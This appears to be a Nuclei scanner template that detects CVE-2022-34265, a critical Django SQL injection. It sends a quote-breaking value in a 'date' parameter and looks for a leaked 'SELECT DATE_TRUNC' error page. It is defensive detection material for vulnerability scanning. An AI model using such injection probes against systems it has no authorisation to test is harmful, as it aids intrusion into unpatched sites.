id: CVE-2022-34265
info:
  name: Django SQL injection
  author: tess
  severity: critical
  description: An issue was discovered in Django 3.2 before 3.2.14 and 4.0 before 4.0.6 are subject to SQL injection if untrusted data is used as a kind/lookup_name value.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-34265
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34265
    - https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-34265
    cwe-id: CWE-89
  metadata:
    verified: true
  tags: cve,cve2022,django

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?date={{randstr}}'{{randstr}}"

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'SELECT DATE_TRUNC'
          - 'Server time:'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 500
